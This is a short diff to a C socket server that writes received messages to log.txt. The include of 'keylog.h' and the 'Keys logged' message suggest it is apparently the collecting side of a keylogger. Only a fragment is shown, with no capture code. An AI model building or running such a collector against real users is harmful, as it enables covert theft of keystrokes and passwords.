@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <signal.h>
+#include "keylog.h"
  
 int socket_desc, new_socket, c;
 FILE *fp;
@@ -21,9 +22,8 @@ int main()
 {
   //int socket_desc , new_socket , c;
   struct sockaddr_in server, client;
-  char message[64];
+  char message[SIZEOF_MESSAGE];
   char *filename;
-  //FILE *fp;
 	 
   //Open File
   filename = "log.txt";
@@ -80,9 +80,9 @@ int main()
       {
         //open up file for append
         fp = fopen(filename, "a+");
-        puts("something");
+        puts("Keys logged");
         //print to and close logfile when done to ensure it can be read
-	fprintf(fp, "%s\n", message);
+	fprintf(fp, "%s", message);
         fclose(fp);
       }
     }
